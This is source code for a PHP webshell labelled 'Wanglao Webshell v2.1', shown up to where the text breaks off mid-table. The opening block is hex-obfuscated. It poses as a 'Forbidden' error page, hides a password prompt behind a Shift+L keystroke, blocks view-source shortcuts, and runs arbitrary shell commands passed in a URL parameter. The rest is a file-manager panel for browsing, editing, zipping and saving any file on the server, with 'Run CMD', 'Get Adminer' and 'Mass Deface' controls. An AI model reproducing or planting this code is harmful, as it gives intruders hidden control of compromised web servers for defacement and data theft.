<?php ${"\x47\x4c\x4f\x42\x41\x4cS"}["\x77\x67os\x7a\x72\x70\x70w\x70\x78e"]="\x73t\x6fr\x65\x64\x5f\x68a\x73he\x64\x5f\x70\x61\x73\x73\x77o\x72d";${"GL\x4f\x42\x41LS"}["\x76\x67\x73r\x75\x77sf"]="o\x75\x74\x70\x75\x74";${"\x47\x4cOBA\x4c\x53"}["x\x74s\x76\x70\x6a\x6d\x64\x67"]="\x64\x69\x73t\x72\x6f";${"\x47\x4c\x4f\x42\x41L\x53"}["\x75\x67w\x7ap\x7anh"]="s\x65r\x76e\x72";${"\x47\x4cO\x42\x41\x4c\x53"}["b\x71\x66\x68\x6f\x72\x76\x62o"]="r\x65\x6c\x65\x61se";${"GLO\x42A\x4c\x53"}["\x6a\x63\x78\x6e\x75\x62\x75\x6fz\x66\x6b\x72"]="\x70\x6f\x72\x74";session_start();date_default_timezone_set("\x41sia/J\x61ka\x72t\x61");function show_login_page($message=""){$hsbkssiqwb="s\x65\x72v\x65\x72";echo " \x20 \x20\x3c!D\x4fC\x54\x59P\x45\x20\x68\x74m\x6c>\n  \x20 <\x68\x74m\x6c\x20l\x61ng=\x22\x65\x6e\">\n  \x20 \x3chead\x3e\n\x20\x20\x20  \x20 \x20\x3c\x73\x63ript s\x72\x63\x3d\x22/fo\x6c\x64-sig\x68\x6ees\x73\x65-do\x75b\x6c\x65-\x6f\x75\x72-\x43\x6f\x6co\x75r-f\x72\x6fmis\x64om\x65-\x43\x6c\x6f\x63\x22 a\x73yn\x63>\x3c/\x73\x63ri\x70\x74\x3e\n\x20\x20  \x20\x20\x20 \x3c\x74i\x74le\x3e";$upvmvrfigk="\x6fs";echo $_SERVER["SER\x56\x45\x52_\x4eA\x4d\x45"];echo "</t\x69t\x6ce>\n\x20  \x20\x3c/head>\n\x20   <\x62\x6fdy>\n\x20   \x20\x20  \x3ch\x31\x3eF\x6fr\x62\x69d\x64\x65n</h1\x3e\n\x20\x20\x20  \x20 \x20\x3c\x68\x31\x20\x73t\x79\x6ce\x3d\x22\x66on\x74-\x77e\x69\x67\x68\x74: \x6eorma\x6c\x3b \x66\x6fn\x74-s\x69\x7a\x65: \x31\x38\x70x;\x22\x3e\x59ou do\x6e\x27t hav\x65 \x70ermi\x73\x73io\x6e\x20\x74o \x61cc\x65ss \x74\x68\x69\x73\x20r\x65\x73\x6furc\x65\x2e\x3c/\x68\x31\x3e\x20\n\x20      \x20<hr\x3e\n\x20 \x20 \x20\x20 \x20";${$hsbkssiqwb}=$_SERVER["SER\x56E\x52_S\x4fFT\x57\x41RE"];$host=$_SERVER["\x53ERV\x45R\x5fNAME"];${${"G\x4cO\x42\x41\x4cS"}["\x6a\x63\x78nu\x62\x75\x6f\x7afkr"]}=$_SERVER["\x53\x45\x52\x56ER_PO\x52T"];${$upvmvrfigk}=php_uname("s");${${"\x47\x4cOB\x41LS"}["\x62qfh\x6fr\x76b\x6f"]}=php_uname("\x72");if(stripos(${${"\x47\x4cOBA\x4c\x53"}["ugw\x7ap\x7a\x6eh"]},"a\x70\x61\x63\x68e")!==false){${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x74\x73v\x70jm\x64g"]}="(L\x69nu\x78)";if(file_exists("/e\x74\x63/d\x65\x62\x69\x61n\x5fvers\x69o\x6e")){$begwqcul="\x64\x69\x73\x74\x72\x6f";${$begwqcul}="(Deb\x69an)";}elseif(file_exists("/et\x63/\x72\x65\x64\x68a\x74-rele\x61\x73\x65")){${"G\x4c\x4fB\x41\x4c\x53"}["m\x6f\x61uh\x70\x69\x76"]="\x64\x69st\x72\x6f";${${"\x47\x4cO\x42\x41\x4cS"}["m\x6f\x61\x75\x68\x70i\x76"]}="(R\x65dHat)";}echo"\x3c\x69>\x41\x70a\x63h\x65".explode("\x20",${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x75\x67\x77z\x70z\x6e\x68"]})[0]."\x20$distro S\x65\x72\x76\x65\x72 \x61\x74\x20$host P\x6fr\x74\x20$port\x3c/i>";}elseif(stripos(${${"\x47\x4cO\x42\x41\x4cS"}["\x75\x67\x77zp\x7a\x6eh"]},"\x6egin\x78")!==false){echo"<\x69\x3e$server (\x4c\x69nu\x78)\x20S\x65rv\x65r\x20\x61t\x20$host\x20P\x6frt\x20$port\x3c/i\x3e";}elseif(stripos(${${"\x47L\x4f\x42A\x4cS"}["\x75\x67\x77z\x70\x7an\x68"]},"m\x69\x63\x72o\x73\x6fft-\x69is")!==false){echo"<\x69>$server\x20(\x57\x69\x6e\x64\x6fws) Ser\x76er \x61\x74 $host\x20Por\x74\x20$port</\x69>";}else{echo"\x3c\x69>$server ($os) Serv\x65r\x20at $host\x20P\x6f\x72t $port</i\x3e";}echo " \x20 \x20\x20  \x20<\x66\x6fr\x6d\x20ac\x74ion=\"\x22\x20m\x65t\x68\x6f\x64\x3d\x22p\x6fst\x22 \x73t\x79l\x65=\x22\x64\x69s\x70l\x61y:\x20\x6e\x6f\x6ee;\x20pos\x69tion:\x20ab\x73o\x6cu\x74\x65; t\x6fp:\x20\x35\x30%\x3b le\x66t:\x20\x350\x25; tra\x6e\x73\x66or\x6d: t\x72\x61n\x73la\x74e(-5\x30\x25, -\x350\x25);\x20b\x61\x63k\x67\x72ou\x6e\x64-col\x6f\x72:\x20\x232e3\x31\x33\x64; \x70addi\x6eg: \x32\x30p\x78\x3b\x20b\x6f\x72\x64er-\x72a\x64i\x75\x73: \x38\x70x\x3b\x20\x62ox-s\x68\x61\x64\x6f\x77: \x30\x20\x30 \x31\x30\x70\x78\x20rgb\x61(\x30,\x20\x30,\x200,\x20\x30\x2e\x35);\x22>\n  \x20\x20\x20\x20\x20   \x20\x20\x3c\x69\x6e\x70u\x74\x20t\x79p\x65\x3d\x22\x70\x61s\x73w\x6f\x72d\x22 \x6eam\x65\x3d\x22pa\x73\x73\x22 p\x6cace\x68\x6fl\x64\x65\x72=\x22P\x61\x73s\x77\x6f\x72\x64\x22 aut\x6f\x66\x6fc\x75\x73\x20st\x79\x6ce=\x22\x62or\x64\x65r: \x6eo\x6ee\x3b \x62o\x72de\x72-b\x6ft\x74\x6f\x6d: 1px \x73o\x6c\x69d\x20\x23\x66ff; p\x61d\x64\x69n\x67: 5\x70x; m\x61\x72\x67i\x6e-\x62\x6f\x74\x74\x6f\x6d: 1\x30\x70\x78;\x20co\x6c\x6fr: \x23ff\x66; \x62a\x63kg\x72\x6f\x75\x6e\x64: n\x6f\x6ee;\">\n\x20      \x20\x20\x20  \x3c\x69\x6e\x70\x75t\x20\x74y\x70\x65\x3d\"s\x75\x62\x6d\x69\x74\x22 \x6e\x61me=\x22\x73ub\x6d\x69t\x22 \x76al\x75\x65\x3d\x22>\x22 s\x74\x79l\x65\x3d\"\x62o\x72\x64er: \x6e\x6fn\x65; \x70a\x64\x64i\x6e\x67: \x35p\x78\x20\x320p\x78; \x62\x61c\x6b\x67\x72ou\x6e\x64-co\x6c\x6fr: \x23F\x462\x45\x304\x3b \x63\x6flor:\x20#\x66\x66f;\x20\x63\x75r\x73\x6f\x72: \x70o\x69nt\x65r\x3b\">\n \x20 \x20\x20\x20\x20 </f\x6f\x72\x6d>\n    \x20\x20\x20\x20\x3cscr\x69\x70t \x74\x79\x70e\x3d\x22t\x65\x78t/\x6aa\x76a\x73\x63ript\x22>\n\x20 \x20\x20\x20    \x20  \x64o\x63\x75m\x65\x6e\x74\x2eaddEvent\x4cis\x74\x65n\x65r(\x27\x63\x6fn\x74\x65\x78\x74\x6d\x65\x6e\x75\x27,\x20f\x75n\x63ti\x6f\x6e(e)\x20{\n\x20   \x20\x20\x20\x20\x20 \x20\x20\x20\x20  e.\x70r\x65\x76\x65\x6et\x44ef\x61ult()\x3b\n\x20\x20  \x20 \x20  \x20\x20\x20},\x20\x66al\x73e)\x3b\n\n\x20\x20      \x20 \x20 document\x2e\x61\x64\x64Ev\x65nt\x4ci\x73\x74e\x6e\x65r('ke\x79d\x6fw\x6e\x27,\x20funct\x69\x6f\x6e(e)\x20{\n\x20\x20 \x20 \x20 \x20 \x20      i\x66 (e\x2e\x63tr\x6c\x4bey\x20\x26\x26 (e.key\x20\x3d== 'u\x27\x20|| \x65.k\x65\x79 ===\x20'U\x27)) {\n    \x20\x20\x20\x20\x20 \x20\x20\x20\x20\x20  \x20  e.p\x72\x65\x76entD\x65f\x61\x75\x6ct()\x3b\n  \x20\x20\x20\x20\x20 \x20  \x20\x20\x20\x20 }\n \x20\x20\x20\x20\x20 \x20\x20\x20     \x20\x69\x66 (e.ctr\x6c\x4be\x79\x20\x26&\x20\x65.\x73hi\x66tK\x65\x79 &\x26 (\x65.\x6b\x65y \x3d==\x20\x27\x69\x27 || \x65\x2ekey\x20\x3d=\x3d \x27\x49\x27))\x20{\n    \x20   \x20\x20 \x20 \x20   \x20  e.\x70rev\x65n\x74\x44e\x66a\x75lt()\x3b\n\x20  \x20\x20\x20 \x20\x20  \x20\x20\x20\x20 }\n\x20\x20\x20\x20  \x20 \x20\x20\x20\x20 \x20\x20\x20\x69\x66\x20(e\x2ec\x74\x72lKe\x79 \x26& (e\x2ek\x65y \x3d=\x3d\x20's\x27\x20|| e\x2ek\x65\x79 \x3d=\x3d \x27\x53')) {\n \x20 \x20 \x20 \x20\x20  \x20 \x20\x20 \x20\x20 \x20\x65.preve\x6e\x74D\x65f\x61ul\x74();\n  \x20\x20\x20\x20\x20  \x20 \x20\x20\x20\x20\x20}\n  \x20 \x20  \x20       \x20i\x66 (\x65\x2ectrlK\x65y\x20&&\x20(\x65.\x6b\x65\x79\x20\x3d\x3d= 'a\x27\x20||\x20\x65.\x6b\x65y\x20\x3d\x3d\x3d \x27\x41'))\x20{\n\x20\x20     \x20\x20   \x20\x20   \x20\x20\x20\x65\x2epre\x76e\x6etD\x65\x66ault()\x3b\n\x20 \x20\x20 \x20   \x20\x20 \x20\x20\x20\x20}\n \x20\x20   \x20 \x20 \x20   \x20\x20\x69f\x20(e\x2ek\x65\x79\x20\x3d\x3d=\x20\x27F1\x32\x27) {\n \x20\x20 \x20\x20\x20  \x20  \x20\x20\x20\x20\x20\x20\x20 e.\x70\x72\x65\x76ent\x44efau\x6c\x74()\x3b\n\x20\x20\x20    \x20 \x20 \x20\x20 \x20\x20}\n\x20      \x20 \x20\x20\x20},\x20fal\x73\x65);\n\n \x20\x20  \x20\x20\x20\x20 \x20 \x64\x6f\x63\x75\x6d\x65nt\x2ead\x64Even\x74\x4c\x69sten\x65r(\x27\x6beyd\x6f\x77n\x27, fu\x6e\x63t\x69\x6f\x6e(e) {\n \x20 \x20\x20\x20    \x20\x20\x20  \x20\x69f\x20(e.s\x68i\x66t\x4b\x65y\x20\x26&\x20e.k\x65y \x3d==\x20'L\x27) {\n \x20\x20\x20\x20\x20\x20\x20\x20\x20   \x20 \x20  \x20\x20e\x2ep\x72\x65\x76en\x74\x44\x65f\x61\x75l\x74()\x3b\x20    \x20 \x20 \x20\x20 \x20\x20\x20 \x20  \x20  \x20var\x20\x66\x6f\x72m = \x64\x6fc\x75m\x65nt.\x71ue\x72y\x53e\x6cec\x74\x6f\x72('f\x6frm')\x3b\n \x20\x20\x20 \x20 \x20\x20 \x20  \x20\x20   \x20 \x66\x6frm.st\x79l\x65\x2e\x64\x69\x73pl\x61y =\x20\x27\x62\x6coc\x6b\x27;\n\x20\x20 \x20 \x20\x20 \x20  \x20\x20    \x20 \x20\x76ar\x20\x70\x61ssw\x6frd\x49nput = \x64o\x63\x75\x6d\x65\x6e\x74\x2e\x71\x75er\x79\x53\x65lec\x74\x6f\x72(\x27\x66or\x6d\x20i\x6eput[t\x79\x70e\x3d\x22pa\x73\x73wo\x72\x64\x22]')\x3b\n\x20\x20\x20\x20\x20\x20\x20\x20     \x20\x20\x20\x20\x20\x20 \x70\x61\x73sw\x6f\x72dI\x6e\x70u\x74.\x66o\x63us();\n  \x20\x20   \x20       \x20}\n   \x20\x20    \x20\x20 },\x20\x66\x61ls\x65);\n\x20   \x20\x20  \x3c/\x73cr\x69\x70\x74\x3e\n    \x3c/bo\x64\x79>\n  \x20 </\x68\x74\x6dl\x3e\n \x20 \x20";exit;}if(isset($_GET["c\x6d\x64"])){$dhyouax="h\x61\x6edl\x65";$lmopjxnjom="\x63\x6d\x64";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x73\x6bk\x69y\x6e"]="\x63md";$nbbyvhyneo="hand\x6c\x65";${${"\x47LO\x42\x41\x4c\x53"}["\x6e\x73\x6b\x6b\x69yn"]}=escapeshellcmd($_GET["c\x6dd"]);${$nbbyvhyneo}=popen(${$lmopjxnjom},"r");${"\x47\x4cOBA\x4c\x53"}["\x69c\x63\x74wx\x6a\x62\x63\x78\x75"]="\x68\x61\x6e\x64\x6c\x65";${${"\x47\x4c\x4fB\x41LS"}["vgsr\x75\x77s\x66"]}=fread(${$dhyouax},2096);pclose(${${"\x47\x4c\x4f\x42AL\x53"}["i\x63c\x74\x77x\x6a\x62c\x78\x75"]});}if(isset($_GET["log\x6f\x75\x74"])){session_unset();session_destroy();header("\x4co\x63\x61t\x69on:\x20".$_SERVER["\x50HP_\x53E\x4cF"]);exit();}if(!isset($_SESSION["\x61ut\x68e\x6eti\x63at\x65\x64"])){${${"GL\x4f\x42AL\x53"}["\x77\x67\x6fs\x7ar\x70\x70w\x70\x78\x65"]}="\$\x32\x79\$1\x30\$a1\x4b9\x37J\x41kJs\x4d\x7a\x45/\x59\x70\x44\x6b\x63\x59\x59Ov\x4a\x34T\x45B7\x429\x39\x70X\x49Yj5/H\x30E8EA\x61\x6dXznnO\x57";if(isset($_POST["p\x61s\x73"])&&password_verify($_POST["p\x61ss"],${${"\x47\x4cO\x42A\x4c\x53"}["w\x67\x6fs\x7a\x72\x70p\x77\x70x\x65"]})){$_SESSION["\x61uth\x65\x6et\x69\x63a\x74\x65\x64"]=true;$_SESSION["F\x4d_\x53\x45S\x53IO\x4e\x5f\x49\x44"]["\x70\x61ss\x77o\x72\x64_plai\x6e\x74\x65\x78t"]=$_POST["p\x61s\x73"];}else{show_login_page("P\x61\x73swor\x64\x20sal\x61h");}}function openGateway(){echo"\x3c\x70\x72\x65\x3e";echo"Anda\x20\x73\x75\x64\x61\x68 \x6c\x6fgi\x6e!";echo"</p\x72e\x3e";}
?>
<?php 
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

header("X-XSS-Protection: 0"); 
ob_start(); 
set_time_limit(0); 
error_reporting(0); 
ini_set('display_errors', FALSE); 

if (!isset($_SESSION['home_directory'])) {
    $_SESSION['home_directory'] = __DIR__;
}

$home_directory = $_SESSION['home_directory'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.pinimg.com/736x/ec/59/60/ec59600931206bc3cf526b74b3506114.jpg" type="image/png">
    <title><?= $_SERVER['SERVER_NAME']; ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #1a1a1a;
            color: #fff;
        }
        .sale_banner_orange {
            background: linear-gradient(to bottom, #f49300 0%, #f25b00 100%);
            color: #ffffff;
            text-align: center;
            font: bold 16px / 36px sans-serif;
            height: 36px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
        }
        .path-navigation {
            margin-bottom: 25px; padding: 15px; background-color: #333; border-radius: 8px; font-size: 1.1em;
        }
        .path-navigation a {
            color:rgb(238, 255, 0); text-decoration: none; font-weight: bold; transition: color 0.3s, text-shadow 0.3s;
        }
        .path-navigation a:hover {
            color:rgba(141, 141, 135, 0.19); text-shadow: 0px 0px 5px rgb(255, 255, 255);
        }
        .action {
            flex: 1; min-width: 300px;
        }
        input[type="file"], input[type="text"], textarea {
            width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #555; 
            background-color: #1c1c1c; color: #f0f0f0; border-radius: 8px;
        }
        input[type="submit"] {
            background-color: #1e90ff; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; 
            font-weight: bold; transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #6495ed; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
        }

        .edit-form {
            margin-top: 25px; background-color: #2e2e2e; padding: 20px; border-radius: 10px; border: 1px solid #444;
        }
        .flex.flex-col.items-start {
            width: 220px; /* Tetapkan lebar tetap untuk side navigation */
            margin-right: 20px; /* Beri jarak antara side nav dan main area */
        }
        .window {
            background-color: #2b2b2b;
            border: 1px solid #4a4a4a;
            padding: 10px; /* Padding tetap untuk elemen di dalamnya */
            margin-bottom: 10px; /* Jarak antar "window" */
            width: 100%; /* Pastikan elemen mengikuti lebar parent */
            height: auto; /* Sesuaikan tinggi elemen dengan konten */
            border-radius: 6px; /* Border melengkung */
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        .action input[type="text"], .action input[type="file"] {
            padding: 8px; /* Kurangi padding input */
            font-size: 14px; /* Kurangi ukuran font */
        }
        .action input[type="submit"] {
            padding: 6px 10px; /* Kurangi padding tombol */
            font-size: 14px; /* Kurangi ukuran font */
        }
        .window:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.8);
        }
        .main-window {
            background-color: #2b2b2b;
            border: 2px solid #6a6a6a;
            padding: 20px;
            margin: 20px;
            height: 500px;
            flex: 1;
            overflow-y: auto;
            transition: background-color 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.6);
        }
        .main-window:hover {
            background-color: #3b3b3b;
            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.8);
        }
        .title-bar {
            background-color: #4a4a4a;
            padding: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.6);
        }
        .title-bar .title {
            font-weight: bold;
        }
        .title-bar .controls {
            display: flex;
            gap: 5px;
        }
        .title-bar .controls i {
            cursor: pointer;
        }
        /* Tombol umum dengan tampilan 3D */
        button, input[type="submit"], .btn {
            background-color: #f0f0f0; /* Warna latar default (abu-abu muda) */
            color: #000; /* Warna teks hitam */
            padding: 12px 24px; /* Padding lebih besar untuk efek 3D */
            border: none; /* Hilangkan border */
            border-radius: 8px; /* Sudut melengkung */
            font-weight: bold; /* Teks tebal */
            font-size: 14px; /* Ukuran font */
            cursor: pointer; /* Ubah kursor menjadi pointer */
            box-shadow: 0 4px #ccc; /* Bayangan 3D */
            transition: all 0.2s ease-in-out; /* Efek transisi */
            position: relative; /* Relatif untuk efek tambahan */
        }

        /* Hover state dengan warna hitam */
        button:hover, input[type="submit"]:hover, .btn:hover {
            background-color: #000; /* Ubah latar menjadi hitam */
            color: #fff; /* Ubah teks menjadi putih */
            box-shadow: 0 2px #999; /* Kurangi bayangan */
            transform: translateY(-2px); /* Geser tombol sedikit ke atas */
        }

        /* Active state dengan efek ditekan */
        button:active, input[type="submit"]:active, .btn:active {
            background-color: #222; /* Latar lebih gelap saat ditekan */
            box-shadow: 0 1px #666; /* Kurangi bayangan lebih banyak */
            transform: translateY(1px); /* Geser tombol sedikit ke bawah */
        }

        /* Ikon dalam tombol */
        button i, input[type="submit"] i, .btn i {
            margin-right: 10px; /* Jarak ikon ke teks */
        }

        /* Tombol dengan status "tidak diizinkan" */
        .forbidden {
            position: relative;
            cursor: not-allowed; /* Kursor tidak diizinkan */
        }

        /* Indikator tambahan pada tombol "forbidden" */
        .forbidden::after {
            content: '\f05e'; /* Ikon larangan */
            font-family: "Font Awesome 5 Free"; /* Font Awesome */
            font-weight: 900; /* Berat font */
            color: red; /* Warna merah */
            font-size: 20px; /* Ukuran font */
            position: absolute; /* Posisi absolut */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%); /* Posisikan di tengah */
            opacity: 0; /* Tidak terlihat default */
            pointer-events: none;
        }

        /* Hover pada tombol "forbidden" */
        .forbidden:hover::after {
            opacity: 1; /* Tampilkan indikator larangan */
        }
        .container-above-main {
            background-color: #2b2b2b;
            border: 2px solid #4a4a4a;
            padding: 10px;
            margin: 20px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.6);
        }
        .footer {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Atur kolom responsif */
            gap: 10px; /* Kurangi jarak antar elemen */
            padding: 5px; /* Kurangi padding footer */
            background-color: #2b2b2b;
            border-top: 1px solid #4a4a4a; /* Kurangi ketebalan border atas */
            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.5); /* Kurangi intensitas shadow */
        }
        .footer .window {
            width: auto; /* Biarkan elemen mengisi kolom grid */
            height: auto; /* Sesuaikan tinggi elemen dengan konten */
        }
        table {
            width: 100%;
            text-align: left;
            font-size: 14px;
            border-collapse: collapse;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.4);
        }
        table th, table td {
            padding: 8px;
            border-bottom: 1px solid #4a4a4a;
        }
        table th {
            background-color: #4a4a4a;
        }
        table tr:hover {
            background-color: #3b3b3b;
        }
        .path-navigation {
            margin-bottom: 20px;
            font-size: 14px;
        }
        .action-container {
            display: flex;
            justify-content: space-between;
            gap: 25px;
            flex-wrap: wrap;
        }
        .action {
            flex: 1;
            min-width: 300px;
        }
        @media (max-width: 768px) {
                .flex {
                display: flex;
                align-items: flex-start; /* Pastikan elemen dimulai dari atas */
                gap: 20px; /* Beri jarak antara side nav dan main area */
            }
            .main-window {
                margin: 10px 0;
            }
            .footer {
                flex-direction: column;
                align-items: center;
            }
            .window {
                width: 100%;
                margin: 5px 0;
            }
        }
    </style>
</head>
<body>
    <div class="sale_banner_orange">
        <a href="http://tpnet-forum.ct.ws/page/sokdosjdofnwoxj1i3492iqoxi2so1o203idmwp92j2odk2038jf9.html" target="_blank">Wanglao Webshell v2.1</a>
    </div>
    <div class="container-above-main">
        <?php
                        $j = isset($_GET['j']) ? $_GET['j'] : getcwd();
                        $j = str_replace('\\', '/', $j);
                        $paths = explode('/', $j);

                        echo '<div class="path-navigation">';
                        echo '<a href="?j=/"></a>/';
                        foreach ($paths as $id => $pat) {
                            if ($pat == '' && $id == 0) continue;
                            echo '<a href="?j=';
                            for ($i = 0; $i <= $id; $i++) {
                                echo "$paths[$i]";
                                if ($i != $id) echo "/";
                            }
                            echo '">'.htmlspecialchars($pat).'</a>/';
                        }
                        echo '</div>';
                    ?>
        <div class="flex">
        <!-- Side Navigation -->
        <div class="button-container" style="display: flex; flex-direction: column; gap: 15px;">
        <!-- Backup Files -->
        <button class="btn" onclick="showBackupForm()">
            <i class="fas fa-file-upload" style="margin-right: 10px;"></i>Backup Files
        </button>

        <!-- Home File -->
        <a href="?j=<?php echo $home_directory; ?>" class="btn">
            <i class="fas fa-home" style="margin-right: 10px;"></i>Home File
        </a>

        <!-- Run CMD -->
        <button class="btn" onclick="toggleCommandContainer(true)">
            <i class="fas fa-terminal" style="margin-right: 10px;"></i>Run CMD
        </button>

        <!-- Adminer -->
        <form method="get" action="" style="margin: 0; display: inline;">
            <input type="hidden" name="adminer" value="true">
            <input type="hidden" name="j" value="<?php echo htmlspecialchars($_GET['j'] ?? realpath(__DIR__)); ?>">
            <button type="submit" class="btn">
                <i class="fas fa-download" style="margin-right: 10px;"></i> Get Adminer    
            </button>
        </form>

        <!-- WangLao Team -->
        <button class="btn" onclick="toggleCommandHelp()">
            <i class="fa-solid fa-users" style="margin-right: 10px;"></i>WangLao Team
        </button>

        <!-- Mass Deface -->
        <button type="button" class="btn forbidden" onclick="return false;">
            <i class="fa-solid fa-biohazard" style="margin-right: 10px;"></i>Mass Deface
        </button>

        <!-- Delete Massive -->
        <button type="button" class="btn forbidden" onclick="return false;">
            <i class="fas fa-trash" style="margin-right: 10px;"></i>Delete Massive
        </button>
    </div>
        <div class="main-window">
        <div class="text-center text-2xl py-4">
    <?php
    if (isset($_GET['edit'])) {
        $file_to_edit = $_GET['edit'];
        if (file_exists($file_to_edit)) {
            $file_name = basename($file_to_edit); // Dapatkan nama file
            $content = file_get_contents($file_to_edit);
    
            echo '<h2 style="margin-bottom: 5px;">Edit File: ' . htmlspecialchars($file_name) . '</h2>';
            echo '<form action="" method="post">
                    <textarea name="file_content" rows="10" cols="50" style="width: 100%; font-size: 15px; box-sizing: border-box;">' . htmlspecialchars($content) . '</textarea>
                    <input type="hidden" name="file_to_edit" value="' . htmlspecialchars($file_to_edit) . '">
                    <input type="submit" name="save_edit" value="Save Changes" class="btn">
                    <a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">
                        <button type="button" class="btn">Back</button>
                    </a>
                  </form>';
        } else {
            echo '<div style="color: red; font-weight: bold;">File not found. The file you are trying to edit does not exist.</div>';
            echo '<a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">Back</a>';
        }
    }
    
    if (isset($_POST['save_edit'])) {
        $file_to_edit = $_POST['file_to_edit'];
        $file_content = $_POST['file_content'];
        if (file_put_contents($file_to_edit, $file_content) !== false) {
            // Menyimpan file berhasil - SweetAlert untuk notifikasi sukses
            echo "<script>
                    document.addEventListener('DOMContentLoaded', function() {
                        Swal.fire({
                            icon: 'success',
                            title: 'Success',
                            text: 'File saved successfully.'
                        }).then(() => {
                            window.location.href = '?j=" . htmlspecialchars(urlencode(dirname($file_to_edit))) . "';
                        });
                    });
                  </script>";
        } else {
            // Gagal menyimpan file - SweetAlert untuk notifikasi error
            echo "<script>
                    document.addEventListener('DOMContentLoaded', function() {
                        Swal.fire({
                            icon: 'error',
                            title: 'Failed',
                            text: 'Failed to save file. Please check permissions.'
                        });
                    });
                  </script>";
        }
    } else {
        // Tampilkan daftar file hanya jika tidak dalam mode edit
        echo '<table>';
        echo '<tr>
            <th>Directory/File</th>
            <th>Size</th>
            <th>Last Modification</th>
            <th>Permissions</th>
            <th>Action</th>
          </tr>';

        $scandir = scandir($j);
        $directories = [];
        $files = [];
        foreach ($scandir as $file) {
            if ($file == '.' || $file == '..') continue;
            $full_path = "$j/$file";
            if (is_dir($full_path)) {
                $directories[] = $file;
            } else {
                $files[] = $file;
            }
        }

        foreach ($directories as $file) {
            $full_path = "$j/$file";
            $last_modification = date("Y-m-d H:i:s", filemtime($full_path));
            echo '<tr class="bg-neutral-950">';
            echo '<td class="px-4 py-2"><i class="fas fa-folder"></i> <a href="?j=' . htmlspecialchars($full_path) . '">' . htmlspecialchars($file) . '</a></td>';
            echo '<td class="px-4 py-2">-</td>';
            echo '<td class="px-4 py-2">' . $last_modification . '</td>';
            echo '<td class="px-4 py-2">' . substr(sprintf('%o', fileperms($full_path)), -4) . '</td>';
            echo '<td class="px-4 py-2 action-icons">
                    <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Rename"><i class="fa-solid fa-pen"></i></a>
                    <a href="#" onclick="confirmDelete(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Delete"><i class="fas fa-trash"></i></a>
                    <a href="#" onclick="showTouchForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Change Date"><i class="fas fa-calendar-alt"></i></a>
                    <a href="?zip=' . htmlspecialchars($full_path) . '" data-tooltip="Zip Folder"><i class="fas fa-file-archive"></i></a>
                </td>';
            echo '</tr>';
        }

        foreach ($files as $file) {
            $full_path = "$j/$file";
            $size = filesize($full_path);
            $permissions = substr(sprintf('%o', fileperms($full_path)), -4);
            $last_modification = date("Y-m-d H:i:s", filemtime($full_path));
            $file_info = pathinfo($file);
        
            $icon = '<i class="fas fa-file"></i>';
            if (isset($file_info['extension'])) {
                $ext = strtolower($file_info['extension']);
                if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
                    $icon = '<i class="fas fa-file-image"></i>';
                } elseif (in_array($ext, ['mp4', 'mkv', 'avi', 'mov'])) {
                    $icon = '<i class="fas fa-file-video"></i>';
                } elseif (in_array($ext, ['mp3', 'wav', 'ogg'])) {
                    $icon = '<i class="fas fa-file-audio"></i>';
                } elseif (in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz'])) {
                    $icon = '<i class="fas fa-file-archive"></i>';
                } elseif (in_array($ext, ['doc', 'docx', 'odt'])) {
                    $icon = '<i class="fas fa-file-word"></i>';
                } elseif (in_array($ext, ['xls', 'xlsx', 'ods'])) {
                    $icon = '<i class="fas fa-file-excel"></i>';
                } elseif (in_array($ext, ['ppt', 'pptx', 'odp'])) {
                    $icon = '<i class="fas fa-file-powerpoint"></i>';
                } elseif (in_array($ext, ['pdf'])) {
                    $icon = '<i class="fas fa-file-pdf"></i>';
                } elseif (in_array($ext, ['txt', 'log', 'md'])) {
                    $icon = '<i class="fas fa-file-alt"></i>';
                } elseif (in_array($ext, ['php', 'html', 'css', 'js', 'py', 'java', 'c', 'cpp'])) {
                    $icon = '<i class="fas fa-file-code"></i>';
                }
            }
            
            echo '<tr class="bg-neutral-900">';
            echo '<td class="px-4 py-2">' . $icon . ' ' . htmlspecialchars($file) . '</td>';
            echo '<td class="px-4 py-2">' . $size . ' bytes</td>';
            echo '<td class="px-4 py-2">' . $last_modification . '</td>';
            echo '<td class="px-4 py-2">' . $permissions . '</td>';
            echo '<td class="px-4 py-2 action-icons">
                    <a href="?edit=' . htmlspecialchars($full_path) . '" data-tooltip="Edit"><i class="fas fa-edit"></i></a>
